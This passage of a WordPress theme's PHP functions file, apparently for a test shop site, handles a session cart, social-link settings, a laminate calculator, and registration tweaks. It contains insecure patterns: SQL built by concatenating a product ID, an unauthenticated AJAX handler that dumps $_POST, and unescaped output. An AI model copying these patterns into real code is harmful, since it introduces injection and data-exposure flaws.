				// $price = $wpdb->get_var( "SELECT meta_value FROM {$wpdb->postmeta} WHERE meta_key='Price' AND post_id='".$prod_id."'");
				// $price = preg_replace("/[^0-9]/", '', $price);
				$img_src = $wpdb->get_var( "SELECT meta_value FROM {$wpdb->postmeta} WHERE meta_key='image1' AND post_id='".$prod_id."'");
				$img_src = preg_replace("/^wp/i", "\/wp", $img_src);
 				$prod_sum = $_SESSION['products'][$prod_id][$v]['count'] * $_SESSION['products'][$prod_id][$v]['sum'];		
 				$total_sum += $prod_sum; 	
				$html .= '<tr id="p_id-'.$prod_id.'">
							<td ><img class="product_img" src="http://'.$_SERVER['HTTP_HOST'].$img_src.'" alt=""></td>
							<td class="title"><a href="'.get_permalink().'">'.$db_options[$v]['title'].'</a></td>
							<td>'.$db_options[$v]['price'].' р.</td>			
							<td>
							<input class="prod_count" data-prod-id="'.$prod_id.'_'.$k.'" style="width: 20px; text-align: center;" type="text" value="'.$_SESSION['products'][$prod_id][$v]['count'].'"/>
							</td>
							<td class="prod_sum">'.$prod_sum.' р.</td>
							<td><a href="#" class="a21_cart_del_prod" data-prod-id="'.$prod_id.'_'.$k.'"><img src="'.get_template_directory_uri().'/images/a21/cart_prod_delete.png"/></a>
							</td>
						</tr>';
			}

		 endwhile; 
		$html .= "<tr class='row_total'> <td></td> <td></td> <td></td> <td>Итого: </td><td class='total_sum'>{$total_sum} р.</td><td></td> </tr>";

     else:  ?>
		<p>  <?php _e( 'No Products'); ?> </p>
	<?php endif;  ?>
	<?php wp_reset_postdata();
	$html .= "</table>";
	// $html .= '<a href="#" id="a21_oformit_zakaz"class="product-buy">Оформить заказ</a>';
	$html .= '<a href="#" id="a21_oformit_zakaz" class="product-buy">Оформить заказ</a>';
	
	 //endif; // check $_SESSION['products'])) 
	echo $html;
	exit;
}

function a21_register_session(){
    if( !session_id() )session_start();
}
add_action('init','a21_register_session');

// To set a SESSION data -
$_SESSION['s_var'] = "alex session";


// add_action("wp_footer","a21_f");
function a21_f(){
		alex_debug(0,1,"sess",$_SESSION);
		// session_destroy();
}
add_action("wp_head","a21_j");
function a21_j(){
	add_option( 'as21_cur_order', 1,'','no' );
	?>
<script>
function ChangeCount(){
	console.log("cart change count");
}

</script>
	<?php
}


/* **** as21 **** */

add_action( 'admin_init', 'alex21_register_settings' );
/*  Register settings */
function alex21_register_settings() 
{
    register_setting( 
        'general', 
        'option_facebook',
        'as21_sanitize_cb_url' // <--- Customize this if there are multiple fields
    );
    
    add_settings_field( 
        'facebook_id', 
        'Facebook:', 
        'alex21_add_html_for_option_facebook', 
        'general'
        // 'site-guide' 
    );
    register_setting( 
        'general', 
        'option_youtube',
        'as21_sanitize_cb_url' // <--- Customize this if there are multiple fields
    );

    add_settings_field( 
        'youtube_id', 
        'Youtube:', 
        'alex21_add_html_for_option_youtube', 
        'general'
        // 'site-guide' 
    );
    register_setting( 
        'general', 
        'option_instagram',
        'as21_sanitize_cb_url' // <--- Customize this if there are multiple fields
    );

    add_settings_field( 
        'instagram_id', 
        'Instagram:', 
        'alex21_add_html_for_option_instagram', 
        'general'
        // 'site-guide' 
    );
}    

function as21_sanitize_cb_url($url){
	return esc_url_raw($url);
	// return strip_tags($a);
	// if( preg_match('#^(http|https):\/\/(www\.)??[a-z0-9-\.]+(\.){1}(com|ru|net)\/??#i', $url) ) return $url;
	// else return false;
}

/* Print settings field content */
function alex21_add_html_for_option_facebook() 
{
    // $value = html_entity_decode (get_option( 'option_facebook' ));
    $value = get_option( 'option_facebook' );
    echo '<input type="url" class="regular-text" id="facebook_id" name="option_facebook" value="' . esc_url( $value ) . '"/>
    		<p class="description">Пример: http://facebook.com</p>';
}
function alex21_add_html_for_option_youtube() 
{
    // $value = html_entity_decode (get_option( 'option_facebook' ));
    $value = get_option( 'option_youtube' );
    echo '<input type="url" class="regular-text" id="youtube_id" name="option_youtube" value="' . esc_url( $value ) . '"/>
    		<p class="description">Пример: http://youtube.com</p>';
}
function alex21_add_html_for_option_instagram() 
{
    // $value = html_entity_decode (get_option( 'option_facebook' ));
    $value = get_option( 'option_instagram' );
    echo '<input type="url" class="regular-text" id="youtube_id" name="option_instagram" value="' . esc_url( $value ) . '"/>
    		<p class="description">Пример: http://instagram.com</p>';
}

add_action('wp_ajax_nopriv_as21_laminat_calc', 'as21_laminat_calc');
function as21_laminat_calc(){

	$n = !empty( $_POST['n'] ) ? (int)$_POST['n'] : 0;
	$q = !empty( $_POST['q'] ) ? (int)$_POST['q'] : 0;
	$phi = !empty( $_POST['phi'] ) ? (int)$_POST['phi'] : 0;
	$width = !empty( $_POST['width'] ) ? (int)$_POST['width'] : 0;
	$length = !empty( $_POST['length'] ) ? (int)$_POST['length'] : 0;
	$surface = ($width/1000 * $length/1000);
	// $n = "dfsdf";

	echo $html =	'
	<div class="inside">
		<div class="print">print</div>
		<h3>Result:</h3>
		<table class="result"><tbody><tr class="even first">
			<td class="col_0">Number of layers</td>
			<td class="col_1">'.$n.' Layers</td>
		</tr><tr class="odd">
			<td class="col_0">Laminate thickness</td>
			<td class="col_1">0 mm</td>
		</tr><tr class="even">
			<td class="col_0">Fibre reinforcement surface area</td>
			<td class="col_1">'.$surface.' m²</td>
		</tr><tr class="odd">
			<td class="col_0">Fibre reinforcement gross weight</td>
			<td class="col_1">'.$q.' g</td>
		</tr><tr class="even">
			<td class="col_0">Resin quantity</td>
			<td class="col_1">0 g</td>
		</tr><tr class="odd">
			<td class="col_0">Laminate weight</td>
			<td class="col_1">0 g</td>
		</tr><tr class="even">
			<td class="col_0">Fibre content (weight) </td>
			<td class="col_1">0 %</td>
		</tr><tr class="odd">
			<td class="col_0">Fibre content (volume)</td>
			<td class="col_1">'.$phi.' %</td>
		</tr></tbody></table>
		<p>Ohne Gewähr</p>
	</div>';	

	// echo "return wp ajax - success";
	echo "<div>"; alex_debug(0,1,"form data",$_POST); echo "</div>";

	exit;
}



/* **** as21 for plugin wp-members **** */

// $wpmem->user->post_data = apply_filters( 'wpmem_register_data', $wpmem->user->post_data, 'new' ); 
// add_filter( 'wpmem_register_fields_arr', wpmem_fields( $tag ), $tag );
// add_filter( 'wpmem_register_fields_arr', 'as21_18101','new');
// $rows = apply_filters( 'wpmem_register_form_rows', $rows, $tag );
add_filter( 'wpmem_register_form_rows','as21_18101'  );

function as21_18101($rows) {
	unset( $rows['username']);
	// $rows['username']['value'] = $rows['username']['field'] = 'user_20171';
	// alex_debug(0,1,'',$rows);
	// var_dump($tag);
	// exit;
	return $rows;
}

	// $wpmem->user->post_data = apply_filters( 'wpmem_pre_validate_form', $wpmem->user->post_data, $tag );
add_filter( 'wpmem_pre_validate_form','as21_18101v'  );

function as21_18101v($post_validate) {
	// unset( $rows['username']);
	// $username = 'user_201713';
	// $mail = 'as_fds35@ya.ru';
	$mail = $post_validate['user_email'];
	$user_mail = explode('@', $mail);
	$username = $user_mail[0];

	if( username_exists($username)) $username = $username.'_'.substr($user_mail[1],0,1);
	$post_validate['username'] = $username; // cоздаем username только на этапе валидации post данных
	// alex_debug(0,1,'validate',$post_validate);
	// exit;
	return $post_validate;
}

add_action( 'wpmem_pre_register_data', 'as21_1810' );
function as21_1810($post){
	// [username] => sfsdf111
	//  [user_nicename] => sfsdf111
	//    [display_name] => sfsdf111
	//    [nickname] => sfsdf111
	$post['username'] = $post['user_nicename'] = $post['display_name'] = $post['nickname'] = 'user_2017';
	// alex_debug(0,1,'',$post);
	return $post;
	// exit;
}

// $default_inputs = apply_filters( 'wpmem_inc_login_inputs', $default_inputs );
add_filter('wpmem_inc_login_inputs','as21_form_login');
function as21_form_login($inputs){
	$inputs[0]['name'] = 'E-mail';
	// alex_debug(0,1,'',$inputs);
	// exit;
	return $inputs;
}

/* **** as21 for plugin wp-members **** */
add_action('wp_head','as21_scpripts');
function as21_scpripts(){
	?>
	<script>var theme = '<?php echo get_template_directory_uri();?>';</script>
	<?php
}

add_action( 'init', 'blockusers_init' );
function blockusers_init() {
	if ( is_admin() && ! current_user_can( 'administrator' ) && ! ( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) {
		wp_redirect( home_url() );
		exit;
	}
}

add_action('after_setup_theme', 'remove_admin_bar');
 
function remove_admin_bar() {
	if (!current_user_can('administrator') && !is_admin()) {
	  show_admin_bar(false);
	}
}

// $meta_box = apply_filter( 'rwmb_normalize_field', $field );
// $field_html = apply_filters( "rwmb_{$field_type}_html", $field_html, $field, $meta );
add_filter( 'rwmb_fieldset_text_html', 'as21_qwer');
function as21_qwer($field_html, $field, $meta ){
	// var_dump($field_html);
	$field_html = explode("<label>", $field_html);
	$field_html[1] = str_replace('rwmb-fieldset_text', 'rwmb-fieldset_text as21_rwmb_title', $field_html[1]);
	$field_html = implode('<label>', $field_html);
	return $field_html;
	// var_dump($field_html);
	// var_dump($field);
	// var_dump($meta);
	//  exit;
}

add_filter( 'rwmb_meta_boxes', 'prefix_register_meta_boxes' );
function prefix_register_meta_boxes( $meta_boxes ) {
    $prefix = 'field_prefix_';
    $meta_boxes[] = array(
        'id'         => 'personal',
        'title'      => 'Варианты товара',
        'post_types' => 'post',
        'context'    => 'normal',
        'priority'   => 'high',
        'class' => 'lala',
        'fields' => array(
            // array(
            //     'name'  => 'Full name',
            //     'desc'  => 'Format: {First Name} {Last Name}',
            //     'id'    => $prefix . 'name',
            //     'type'  => 'text',
            // ),
            array(
		    'id'      => 'as21_prod_options',
		    'name'    => '',
		    // 'name'    => 'Варианты',
		    'type'    => 'fieldset_text',

		    // Options: array of key => Label for text boxes
		    // Note: key is used as key of array of values stored in the database
		    'options' => array(
		        'title'    => 'Назв.',
		        'price' => 'Цена',
		        'base_price' => 'Баз. цена',
		        'artikul' => 'Арт.',
		    ),

		    // Is field cloneable?
		    'clone' => true,
		            'add_button'    => '+ Добавить новую группу полей',

		),

        )
    );

    // Add more meta boxes if you want
    // $meta_boxes[] = ...

    return $meta_boxes;
}

add_action("wp_footer",'as21_system_message');
function as21_system_message(){
	?>
	<div class="as21_system_message">Это тестовый сайт!</div>
	<?php
}

// add_filter( 'rwmb_group_add_clone_button_text', 'prefix_group_add_clone_button_text', 10, 2 );
// function prefix_group_add_clone_button_text( $text, $field )
// {
//     return __( 'Add Article', 'textdomain' );
//     var_dump($text);
//     exit;
// }
// add_filter( 'add_clone_button_text', 'prefix_group_add_clone_button_text1', 10, 2 );
// function prefix_group_add_clone_button_text1( $text, $field )
// {
//     return __( 'Add Article', 'textdomain' );
// }


// TEMP for DEBUG


function alex_debug ( $show_text = false, $is_arr = false, $title = false, $var, $sep = "<br>"){
	
	//  alex_debug(0,0,'$enable_auto',$enable_auto);
	$debug_text = "<br>======= Debug MODE ========<br>";
	if( boolval($show_text) ) echo $debug_text;
	if( boolval($is_arr) ){
		echo $title."-";
		echo "<pre>";
		print_r($var);
		echo "</pre>";
		echo "<hr>";
	} else echo "<b>".$title.":</b> ".$var;
	if($sep == "line") echo "<hr>"; else echo $sep;
}

/* **** get name page template (получение названия шаблона страницы) ****** */
// add_action("wp_footer","wp_get_name_page_template");
function wp_get_name_page_template(){

	// echo "<div style='width:16px;height:16px;background:red;'></div>";
    global $template;
    // echo basename($template);
    // полный путь с названием шаблона страницы
    echo "1- ".$template;
	echo "<br>2- ".$page_template = get_page_template_slug( get_queried_object_id() )." | ";
	// echo $template = get_post_meta( $post->ID, '_wp_page_template', true );
	// echo $template = get_post_meta( get_queried_object_id(), '_wp_page_template', true );
	// echo "id= ".get_queried_object_id();
	echo "<br>3- ".$_SERVER['PHP_SELF'];
	echo "<br>4- ".__FILE__;
	echo "<br>5- ".$_SERVER["SCRIPT_NAME"];
	echo "<br>6- ".$_SERVER['DOCUMENT_ROOT'];
	print_r($_SERVER);
}
/* **** get name page template (получение названия шаблона страницы) ****** */

// add_filter("wpmem_login_form","as21_a1",2);
// function as21_a1($form){
// 	$form .= '<a href="/register">Регистрация</a>';
// 	return $form;
// }

function deb_last_query(){

	global $wpdb;
	echo '<hr>';
	echo "<b>last query:</b> ".$wpdb->last_query."<br>";
	echo "<b>last result:</b> "; echo "<pre>"; print_r($wpdb->last_result); echo "</pre>";
	echo "<b>last error:</b> "; echo "<pre>"; print_r($wpdb->last_error); echo "</pre>";
	echo '<hr>';
}